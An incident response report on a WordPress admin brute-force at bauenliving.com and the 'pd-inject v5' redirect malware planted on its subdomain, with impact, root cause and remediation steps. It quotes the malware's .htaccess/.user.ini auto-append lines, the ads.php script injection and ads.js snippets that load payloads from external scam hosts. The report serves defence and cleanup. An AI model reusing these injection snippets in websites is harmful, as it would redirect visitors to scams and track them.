Executive Summary

Critical Finding On 7 June 2026 at approximately 01:59 AM (ICT), an attacker successfully compromised the WordPress administrator account for bauenliving.com through a coordinated brute-force attack. The attacker then planted a commercial-grade malware kit called "pd-inject v5" inside the vt.bauenliving.com subdomain, which injected a fake "Notice" popup into every page visitor, redirecting them to fraudulent advertising and scam websites. The malware operated undetected for 16 days (7 – 23 June 2026).

Business Impact

  • Brand damage: Visitors to bauenliving.com and vt.bauenliving.com were shown a fake system alert popup and redirected to adult/scam content, directly damaging trust in the BAUEN by SCG brand.
  • SEO / Google ranking risk: Google Safe Browsing flags sites with malicious redirects; this can result in search demotion or a "Dangerous Site" warning in Chrome.
  • Data privacy: The malware tracked visitor IP addresses and referrer URLs in an attacker-controlled log file, constituting unauthorized personal data collection.
  • Duration of exposure: 17 confirmed victim sessions were logged by the attacker between 7 June and 22 June 2026.

Root Cause Analysis

Root Cause — Confirmed The attack was made possible by a successful brute-force of the WordPress login page. The limit-login-attempts-reloaded plugin was installed but failed to block the attack because the attacker used 50+ different IP addresses (distributed botnet), rotating through them to stay under any single-IP lockout threshold.

How the Malware Works

Stage 1 — PHP Auto-Append via .htaccess + .user.ini

# Attacker inserted into vt.bauenliving.com/.htaccess: # PD-INJ-START <IfModule mod_php8.c> php_value auto_append_file "/var/www/vhosts/bauenliving.com/vt.bauenliving.com/ads.php" </IfModule> # PD-INJ-END # Also in .user.ini (PHP CGI/FPM override): auto_append_file = "/var/www/vhosts/bauenliving.com/vt.bauenliving.com/ads.php"

Stage 2 — ads.php injects script tag into every HTML response

// ads.php — pd-inject v5 — appended to EVERY PHP page response: echo '<!-- pd-inj v5 -->'; echo '<script src="/ads.js"></script>';

Stage 3 — ads.js shows fake "Notice" popup, redirects to scam network

/* pd-fakeclose — creates fake "⚠️ Notice" overlay */ var U = "https://scarleterror.com/ivigjntj?key=..." /* When visitor clicks "Close" button → opens scam URL in new tab */ window.open(U, "_blank"); /* pd-rotator — loads additional malware from external server */ var s = ["https://scarleterror.com/61/87/2c/61872c...js"] /* Loads chain: scarleterror.com → corevibe-network.com → telkucton.org */

Recommended Actions

P1 Immediate
Remove all malware files from vt.bauenliving.com

Delete ads.php, ads.js, .ads.log. Remove injected blocks from .htaccess and .user.ini. Clean injected script tag from updraft/index.html. Delete the entire .trash/ folder. This stops the active redirect immediately.

P1 Immediate
Reset ALL WordPress admin passwords

All 7 administrator accounts must have their passwords changed to a randomly generated 20+ character password. The attacker successfully brute-forced at least one account and may have added backdoor credentials.

P1 Immediate
Enable Two-Factor Authentication (2FA) on WordPress

Install the "WP 2FA" plugin. Require 2FA for all administrator and editor accounts. A brute-forced password alone will not be sufficient to gain access with 2FA enabled.

P2 This Week
Block wp-login.php with IP Allowlist or Cloudflare WAF

Restrict access to /wp-login.php to known office/VPN IP addresses via .htaccess, or deploy Cloudflare in front of the site and enable their Bot Fight Mode and WAF rule for WordPress login protection.

P2 This Week
Change Plesk/SSH credentials for the "bauen" system user

The server SSH credentials were used in this investigation. Rotate the Plesk system user password and generate new SSH key pairs. The attacker had access to the WP admin but may have also attempted server-level access.

P2 This Week
Assess PDPA Notification Obligation

17 visitor IP addresses and referrer URLs were captured by the attacker. Under Thailand PDPA, the organization should consult legal counsel on whether a data breach notification is required to the PDPC and to affected individuals.

P3 This Month
Deploy File Integrity Monitoring

Configure Plesk's built-in "Website Security" (Imunify360) or install Wordfence to alert on any new/modified files in the web root. The 16-day detection gap would be reduced to hours.

P3 This Month
Submit Site for Google Safe Browsing Review

After cleanup, submit bauenliving.com and vt.bauenliving.com to Google Search Console → Security Issues to remove any malware flags and restore search ranking.

P4 Ongoing
Reduce WordPress Admin Account Count

7 active Administrator accounts were found. Principle of least privilege: reduce to 2–3 administrators maximum. Editors should not have Administrator role. Review all accounts and reassign roles appropriately.
